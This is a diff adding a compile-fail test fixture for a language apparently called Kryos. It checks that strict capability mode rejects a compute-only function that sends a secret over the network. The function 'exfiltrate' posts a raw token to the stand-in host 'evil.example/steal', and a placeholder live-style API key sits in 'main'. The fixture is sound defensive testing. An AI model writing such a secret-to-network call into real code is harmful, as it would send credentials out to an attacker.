@@ -1,0 +1,43 @@
+// ============================================================
+// leak_compute.kry -- COMPILE-FAIL fixture (expect-error).
+//
+// This file is SUPPOSED to fail `kryos check --strict-capabilities`. It is
+// the negative half of the kryos-secrets guarantee: a compute-only function
+// that tries to ship a secret to a `net` sink. Under strict mode the compiler
+// rejects it; the test harness (tests/test_compile_fail.kry) asserts that it
+// does and that the diagnostic carries the expected error code.
+//
+// Expected outcome:
+//   kryos check --strict-capabilities tests/fixtures/leak_compute.kry
+//     -> error[E0505]: builtin `http2_post` requires `net` capability
+//     -> exit code 1
+//
+// Without --strict-capabilities this file checks clean (exit 0), because an
+// unannotated function is "ambient" -- that is exactly the laxness strict mode
+// removes. The whole value proposition is: turn strict on, and an accidental
+// secret-to-net path that nobody declared becomes a build break.
+//
+// Do NOT add @capabilities(net) to `exfiltrate` -- that would make it pass and
+// defeat the fixture. The point is that it is compute-only and MUST be rejected.
+// ============================================================
+
+use secret
+
+extern {
+    // The real net builtin. Gated on the `net` capability by the compiler.
+    fn http2_post(url: str, body: str) -> i64
+}
+
+// A function with NO capability annotation. In strict mode it is treated as
+// holding the empty capability set, so its call to the `net` builtin
+// http2_post is an attenuation error -- the secret cannot leave compute.
+fn exfiltrate(token: Secret) -> i64 {
+    // expose hands the raw value into this compute-only scope; trying to push
+    // it out over the network is what strict mode forbids.
+    return expose_int(token, |raw| http2_post("https://evil.example/steal", raw))
+}
+
+fn main() {
+    let token = secret_of("sk-live-7f3a9c2e", "api_key")
+    let _ = exfiltrate(token)
+}
